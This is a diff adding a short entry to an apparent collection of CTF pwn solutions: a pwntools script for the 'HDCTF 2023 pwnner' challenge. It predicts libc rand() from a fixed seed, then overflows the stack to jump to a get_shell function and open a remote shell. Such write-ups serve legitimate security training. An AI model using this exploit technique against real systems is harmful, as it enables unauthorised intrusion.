@@ -198,3 +198,25 @@ payload1=flat([stack_overflow,fun_addr])
 p.sendline(payload1)
 p.interactive()
 ```
+
+## [HDCTF 2023]pwnner
+
+```python
+from pwn import *
+from ctypes import *
+context(log_level='debug',arch='amd64',os='linux')
+p=remote("node5.anna.nssctf.cn",28292)
+elf=ELF('./attachment')
+ctype=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
+ctype.srand(0x39)
+payload1=str(ctype.rand()).encode()
+p.recvuntil("you should prove that you love pwn,so input your name:")
+p.sendline(payload1)
+stack_overflow=cyclic(0x40+0x8)
+ret_addr=p64(0x40028b)
+backdoor_addr=p64(elf.sym["get_shell"])
+payload2=flat([stack_overflow,ret_addr,backdoor_addr])
+p.recvuntil("ok,you have a little cognition about pwn,so what will you do next?")
+p.sendline(payload2)
+p.interactive()
+```
